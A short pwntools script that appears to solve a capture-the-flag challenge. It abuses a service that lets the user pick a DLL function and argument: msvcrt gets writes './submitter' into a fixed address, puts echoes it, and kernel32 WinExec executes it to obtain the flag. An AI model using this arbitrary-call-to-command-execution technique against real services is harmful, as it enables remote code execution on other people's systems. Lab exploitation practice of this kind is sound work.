from pwn import *
import os
HOST = os.environ.get("HOST", "localhost")
PORT = 31337
r = connect(HOST, int(PORT))

# r = process("./challenge")
r.sendlineafter(b"load?", b"msvcrt")
r.sendlineafter(b"call?", b"gets")
r.sendlineafter(b"argument?", str(0x140014000).encode())
r.sendlineafter(b"ling it!", b"./submitter")

r.sendlineafter(b"load?", b"msvcrt")
r.sendlineafter(b"call?", b"puts")
r.sendlineafter(b"argument?", str(0x140014000).encode())

r.sendlineafter(b"load?", b"kernel32")
r.sendlineafter(b"call?", b"WinExec")
r.sendlineafter(b"argument?", str(0x140014000).encode())

r.recvuntil(b"Flag")
print(r.recvline())
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())
